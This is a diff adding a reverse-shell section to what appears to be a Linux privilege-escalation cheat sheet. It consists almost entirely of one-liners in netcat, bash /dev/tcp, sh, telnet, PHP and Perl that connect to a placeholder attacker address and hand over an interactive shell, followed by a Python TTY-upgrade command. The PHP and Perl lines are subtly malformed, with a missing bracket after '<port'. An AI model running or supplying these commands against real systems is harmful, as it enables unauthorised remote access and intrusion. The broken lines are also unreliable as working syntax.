@@ -1,5 +1,18 @@
 *Linux elevation of privileges*narrative
 
+Getting a reverse shell
+    Using netcat
+    *nc <attacker_ip> <port> -e /bin/bash*
+    Using bash and TCP sockets
+    */bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1*
+    Using sh
+    0<&196;exec 196<>/dev/tcp/<attacker_ip>/<port>; sh <&196 >&196 2>&196
+    Using telnet
+    *telnet <attacker_ip> <1st_port> | /bin/bash | telnet <attacker_ip> <2nd_port>*
+    PHP and sh
+    *php -r '$sock=fsockopen("<attacker_ip>",<port);exec("/bin/sh -i <&3 >&3 2>&3");'*
+    Perl and sh
+    *perl -e 'use Socket;$i="<attacker_ip>";$p=<port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'*
 Post exploitation
     Get a TTY shell after a reverse shell connection
     *$ python -c 'import pty;pty.spawn("/bin/bash")'*
